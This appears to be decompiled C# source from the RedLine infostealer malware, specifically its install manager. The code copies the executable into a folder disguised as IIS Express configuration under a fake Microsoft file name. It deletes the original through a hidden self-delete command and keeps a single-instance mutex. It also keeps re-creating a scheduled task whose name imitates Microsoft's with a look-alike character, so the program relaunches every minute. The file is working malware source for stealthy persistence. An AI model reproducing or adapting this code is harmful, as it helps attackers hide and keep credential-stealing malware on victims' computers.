using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace RedLine.Logic.Others
{
  public static class InstallManager
  {
    public static string InstallDirectory = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents\\IISExpress\\Config");
    private static Mutex appMutex;
    public const string TaskSchedulerName = "MicrosoftIIS_CheckInstalledUpdater";
    public const string InstallFileName = "MicrosoftIISAdministration_v2.exe";

    public static string InstallPath
    {
      get
      {
        return Path.Combine(InstallManager.InstallDirectory, "MicrosoftIISAdministration_v2.exe");
      }
    }

    public static string CurrentExeFile
    {
      get
      {
        return Assembly.GetExecutingAssembly().Location;
      }
    }

    public static bool IsSecondCopy { get; private set; }

    public static bool IsRunningFromInstallPath
    {
      get
      {
        return string.Equals(InstallManager.InstallPath, InstallManager.CurrentExeFile, StringComparison.OrdinalIgnoreCase);
      }
    }

    public static void RemoveCurrent()
    {
      Process.Start(new ProcessStartInfo()
      {
        Arguments = string.Format("/C taskkill /F /PID {0} && choice /C Y /N /D Y /T 3 & Del \"{1}\"", (object) Process.GetCurrentProcess().Id, (object) InstallManager.CurrentExeFile),
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe",
        RedirectStandardOutput = true,
        UseShellExecute = false
      }).WaitForExit();
    }

    public static void KillInstalled()
    {
      foreach (Process process in Process.GetProcesses())
      {
        try
        {
          if (string.Equals(process.ProcessName, "MicrosoftIISAdministration_v2.exe".Split('.')[0], StringComparison.OrdinalIgnoreCase))
          {
            if (string.Equals(process.MainModule.FileName, InstallManager.InstallPath, StringComparison.OrdinalIgnoreCase))
            {
              process.Kill();
              process.WaitForExit();
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
    }

    public static void AddTaskScheduler()
    {
      new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          try
          {
            string[] strArray = new string[7]
            {
              "/create /tn \\Microsоft\\MicrosoftIIS_CheckInstalledUpdater",
              Math.Abs((Environment.MachineName + Environment.UserName + (object) Environment.OSVersion).GetHashCode()).ToString(),
              " /tr \"",
              InstallManager.CurrentExeFile,
              "\" /st ",
              null,
              null
            };
            DateTime dateTime = DateTime.Now;
            dateTime = dateTime.AddMinutes(1.0);
            strArray[5] = dateTime.ToString("HH:mm");
            strArray[6] = " /du 9999:59 /sc daily /ri 1 /f";
            string str = string.Concat(strArray);
            Process.Start(new ProcessStartInfo()
            {
              Arguments = str,
              WindowStyle = ProcessWindowStyle.Hidden,
              CreateNoWindow = true,
              RedirectStandardOutput = true,
              UseShellExecute = false,
              FileName = "schtasks.exe"
            }).WaitForExit();
          }
          catch (Exception ex)
          {
            Console.WriteLine((object) ex);
          }
          Thread.Sleep(50000);
        }
      }))
      {
        IsBackground = true
      }.Start();
    }

    public static void Install()
    {
      if (!InstallManager.IsRunningFromInstallPath)
      {
        if (!Directory.Exists(InstallManager.InstallDirectory))
          Directory.CreateDirectory(InstallManager.InstallDirectory);
        InstallManager.KillInstalled();
        File.Copy(InstallManager.CurrentExeFile, InstallManager.InstallPath, true);
        Process process = Process.Start(new ProcessStartInfo()
        {
          FileName = "MicrosoftIISAdministration_v2.exe",
          WorkingDirectory = InstallManager.InstallDirectory
        });
        while (process.Handle == IntPtr.Zero)
          Thread.Sleep(100);
        InstallManager.RemoveCurrent();
      }
      else
      {
        bool createdNew;
        InstallManager.appMutex = new Mutex(true, Math.Abs((Environment.MachineName + Environment.UserName + (object) Environment.OSVersion).GetHashCode()).ToString(), out createdNew);
        InstallManager.IsSecondCopy = !createdNew;
        if (InstallManager.IsSecondCopy)
          Environment.Exit(0);
        InstallManager.AddTaskScheduler();
      }
    }
  }
}
